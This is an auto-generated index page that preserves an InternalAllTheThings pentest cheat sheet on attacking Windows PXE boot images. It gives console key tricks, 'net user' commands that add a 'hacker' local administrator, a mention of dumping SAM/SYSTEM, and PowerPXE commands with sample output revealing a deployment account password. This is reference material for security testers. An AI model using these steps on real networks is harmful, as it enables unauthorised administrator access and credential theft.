---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Internal - PXE Boot Image

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-internal-pxe-boot-image` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/internal-pxe-boot-image.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Internal - PXE Boot Image](../../topics/active-directory/internal-pxe-boot-image.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-internal-pxe-boot-image |
| name | Internal - PXE Boot Image |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/internal-pxe-boot-image.md |

## Preserved Source Material

````yaml
_body: "# Internal - PXE Boot Image\n\nPXE allows a workstation to boot from the network by retrieving an operating system\
  \ image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image\
  \ and interact with it.\n\n- Press **[F8]** during the PXE boot to spawn an administrator console on the deployed machine.\n\
  - Press **[SHIFT+F10]** during the initial Windows setup process to bring up a system console, then add a local administrator\
  \ or dump SAM/SYSTEM registry.\n\n    ```powershell\n    net user hacker Password123! /add\n    net localgroup administrators\
  \ /add hacker\n    ```\n\n- Extract the pre-boot image (wim files) using [PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe)](https://github.com/wavestone-cdt/powerpxe)\
  \ and dig through it to find default passwords and domain accounts.\n\n    ```powershell\n    # Import the module\n    PS\
  \ > Import-Module .\\PowerPXE.ps1\n\n    # Start the exploit on the Ethernet interface\n    PS > Get-PXEcreds -InterfaceAlias\
  \ Ethernet\n    PS > Get-PXECreds -InterfaceAlias « lab 0 » \n\n    # Wait for the DHCP to get an address\n    >> Get a\
  \ valid IP address\n    >>> >>> DHCP proposal IP address: 192.168.22.101\n    >>> >>> DHCP Validation: DHCPACK\n    >>>\
  \ >>> IP address configured: 192.168.22.101\n\n    # Extract BCD path from the DHCP response\n    >> Request BCD File path\n\
  \    >>> >>> BCD File path:  \\Tmp\\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd\n    >>> >>> TFTP IP Address:  192.168.22.3\n\
  \n    # Download the BCD file and extract wim files\n    >> Launch TFTP download\n    >>>> Transfer succeeded.\n    >> Parse\
  \ the BCD file: conf.bcd\n    >>>> Identify wim file : \\Boot\\x86\\Images\\LiteTouchPE_x86.wim\n    >>>> Identify wim file\
  \ : \\Boot\\x64\\Images\\LiteTouchPE_x64.wim\n    >> Launch TFTP download\n    >>>> Transfer succeeded.\n\n    # Parse wim\
  \ files to find interesting data\n    >> Open LiteTouchPE_x86.wim\n    >>>> Finding Bootstrap.ini\n    >>>> >>>> DeployRoot\
  \ = \\\\LAB-MDT\\DeploymentShare$\n    >>>> >>>> UserID = MdtService\n    >>>> >>>> UserPassword = Somepass1\n    ```\n\n\
  ## References\n\n- [Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling](https://blog.netspi.com/attacks-against-windows-pxe-boot-images/)\n\
  - [COMPROMISSION DES POSTES DE TRAVAIL GRÂCE À LAPS ET PXE MISC n° 103 - mai 2019 - Rémi Escourrou, Cyprien Oger](https://connect.ed-diamond.com/MISC/MISC-103/Compromission-des-postes-de-travail-grace-a-LAPS-et-PXE)"
_relative_path: active-directory/internal-pxe-boot-image.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/internal-pxe-boot-image.md
````
